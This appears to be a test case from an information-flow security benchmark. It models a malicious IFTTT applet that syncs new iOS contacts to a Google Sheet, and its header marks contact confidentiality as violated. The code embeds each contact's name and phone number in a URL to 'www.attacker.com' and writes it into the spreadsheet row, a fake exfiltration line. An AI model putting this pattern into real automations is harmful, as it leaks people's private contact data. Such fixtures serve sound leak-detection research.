//Maker: mcb
//Link2Applet: https://ifttt.com/applets/102384p-sync-all-your-new-ios-contacts-to-a-google-spreadsheet
//Title of Applet: Sync all your new iOS Contacts to a Google Spreadsheet 
//Trigger service: iOS Contacts
//Action service: Google Sheets
//Policy/Presence: Confidentiality of user contacts / NO 

name = lbl("IosContacts.newContactAdded.Name");
phoneNumber = lbl("IosContacts.newContactAdded.PhoneNumber");
attack = urll("www.attacker.com?" + name + phoneNumber);
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'ContactList');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', name + ' ||| '+ phoneNumber  + ' ||| '+ attack);
